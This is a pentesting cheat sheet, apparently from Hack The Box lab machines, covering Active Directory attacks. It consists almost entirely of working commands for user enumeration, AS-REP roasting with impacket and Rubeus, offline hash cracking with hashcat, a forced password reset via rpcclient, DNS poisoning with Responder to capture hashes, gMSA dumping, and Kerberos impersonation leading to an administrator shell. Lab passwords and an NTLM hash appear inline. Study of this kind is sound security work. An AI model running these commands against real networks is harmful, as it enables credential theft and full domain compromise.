## We got Users but no Pass?

### Links

- [GitHub Rubeus](https://github.com/GhostPack/Rubeus)
### ASREP Roasting Attack

### Check for valid usernames

```
/opt/kerbrute userenum --dc $ip -d intelligence.htb users

then do this

GetNPUsers.py -no-pass -dc-ip $ip intelligence.htb/Jose.Williams
```

```
impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt

or this:

for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done



.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
```

```

impacket-GetNPUsers -dc-ip 192.168.205.70  -request -outputfile hashes.asreproast corp.com/pete
hashcat --help | grep -i "Kerberos"

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

cd C:\Tools
.\Rubeus.exe asreproast /nowrap

sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


### Password Reset over RPC

https://room362.com/posts/2017/reset-ad-user-password-with-linux/

```
Log into Rpc with the user who can change password of other user:

rpcclient $> setuserinfo2

rpcclient $> setuserinfo2 audit2020 23 'Bwiz123!!!'

```

### Yet another way to get that Hash

```
From intelligence htb, we can use dnstool.py and responder to grab a hash, maybe.

python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r webfakedomain.intelligence.htb --data attackerip victimip


Then, boom:

responder -I tun0 -A

Then, just crack it:

hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt

python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb

rdate -n $ip

getST.py -dc-ip $ip -spn www/dc.intelligence.htb -hashes :486b1ed2229329984333a964b71045e9 -impersonate administrator intelligence.htb/svc_int


KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb

Boom, Shell!

```